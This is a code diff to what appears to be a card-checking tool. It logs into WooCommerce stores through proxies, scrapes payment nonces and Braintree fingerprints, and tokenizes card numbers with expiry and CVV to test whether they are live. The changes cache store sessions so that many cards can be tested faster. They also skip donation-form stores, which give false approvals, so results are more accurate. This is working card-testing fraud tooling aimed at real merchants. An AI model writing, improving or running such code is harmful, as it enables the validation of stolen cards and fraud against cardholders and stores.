@@ -775,10 +775,23 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
     def _logged_in():
         return any(c.startswith("wordpress_logged_in") for c in client.cookies.keys())
 
+    cache_key = base
+    cached = _cache_get(cache_key)
+
     # 1/2. log in, unless the session is still alive.  A session that is
     # still good saves the login, and a store that is busy with logins
     # is a store that answers slowly.
-    if not _logged_in():
+    if cached:
+        # the cookies of the last login are put back, so the session is
+        # still good
+        for name, value in (cached.get("cookies") or {}).items():
+            try:
+                client.cookies.set(name, value)
+            except Exception:
+                pass
+        if not _logged_in():
+            cached = None
+    if not cached:
         r = await client.get(f"{base}/my-account/", headers=headers_page)
         if r.status_code != 200:
             return None, f"the account page answered {r.status_code}", None
@@ -802,23 +815,29 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
             return None, "the store did not accept the login", None
 
     # 3. the add payment method page, for the two nonces it carries
-    r = await client.get(f"{base}/my-account/add-payment-method/",
-                         headers={**headers_page,
-                                  "Referer": f"{base}/my-account/payment-methods/"})
-    if r.status_code != 200:
-        return None, f"the add payment method page answered {r.status_code}", None
-    html = r.text
-    m = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([^"\']+)', html)
-    woo_nonce = m.group(1) if m else ""
-    m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html)
-    client_token_nonce = m.group(1) if m else ""
-    if not woo_nonce or not client_token_nonce:
-        return None, "the store gave no payment method nonces", None
+    if cached:
+        woo_nonce = cached.get("woo_nonce", "")
+        client_token_nonce = cached.get("client_token_nonce", "")
+        fingerprint = cached.get("fingerprint", "")
+    else:
+        r = await client.get(f"{base}/my-account/add-payment-method/",
+                             headers={**headers_page,
+                                      "Referer": f"{base}/my-account/payment-methods/"})
+        if r.status_code != 200:
+            return None, f"the add payment method page answered {r.status_code}", None
+        html = r.text
+        m = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([^"\']+)', html)
+        woo_nonce = m.group(1) if m else ""
+        m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html)
+        client_token_nonce = m.group(1) if m else ""
+        fingerprint = ""
+        if not woo_nonce or not client_token_nonce:
+            return None, "the store gave no payment method nonces", None
 
     # 4. the braintree fingerprint.  The store hands one out with its
     #    client token, and the server keeps one for when the store is
     #    out of reach.
-    fingerprint = site.get("fingerprint") or ""
+    fingerprint = fingerprint or site.get("fingerprint") or ""
     if not fingerprint:
         if not client_token_nonce:
             return None, "the store gave no client token nonce", None
@@ -843,6 +862,17 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
             fingerprint = json.loads(base64.b64decode(client_token))["authorizationFingerprint"]
         except Exception:
             return None, "the client token could not be read", None
+
+    # the session is kept, so the next card does not log in again
+    try:
+        _cache_put(cache_key, {
+            "cookies": {c.name: c.value for c in client.cookies.jar},
+            "woo_nonce": woo_nonce,
+            "client_token_nonce": client_token_nonce,
+            "fingerprint": fingerprint,
+        })
+    except Exception:
+        pass
 
     # 5. tokenize the card
     session_id = str(uuid.uuid4())
@@ -940,6 +970,32 @@ async def _wc_account_check(client, site, cc, mm, yy, cvv):
     return None, f"the store answered http {r.status_code}", card_info
 
 
+# The store session is kept between cards.  Logging in and fetching the
+# braintree token again for every card cost about seven seconds each
+# time; the session lasts much longer than that, so it is kept and the
+# card itself is what takes the time.
+_SESSION_CACHE = {}
+_SESSION_TTL = 900
+
+
+def _cache_get(key):
+    entry = _SESSION_CACHE.get(key)
+    if not entry:
+        return None
+    if time.time() - entry["at"] > _SESSION_TTL:
+        _SESSION_CACHE.pop(key, None)
+        return None
+    return entry
+
+
+def _cache_put(key, value):
+    value = dict(value)
+    value["at"] = time.time()
+    _SESSION_CACHE[key] = value
+    return value
+
+
+
 def _dead_proxy(result):
     """The answer that says the proxy never came back."""
     text = str(result)
@@ -1014,11 +1070,14 @@ async def _check_card_braintree_run(cc, mm, yy, cvv, proxy=None):
                                 account.get("url"), detail)
                     break
 
-            # 1. the stores with a donation form.  These are the
-            #    braintree stores and nothing else: the account flow
-            #    above is the WooCommerce one.
-            sites = all_sites()
-            sites.sort(key=lambda s: 0 if s["type"] == "woocommerce" else 1)
+            # 1. the stores with a donation form.  The auth gate does
+            #    not use them: a donation is not a $0 authorization,
+            #    and it answers with "approved" for cards the issuer
+            #    refuses.  They are left for the charge gate.
+            sites = []
+            if os.environ.get("B3_ALLOW_DONATION", "").strip() == "1":
+                sites = all_sites()
+                sites.sort(key=lambda s: 0 if s["type"] == "woocommerce" else 1)
 
             for site_info in sites:
                 site_url = site_info["url"]
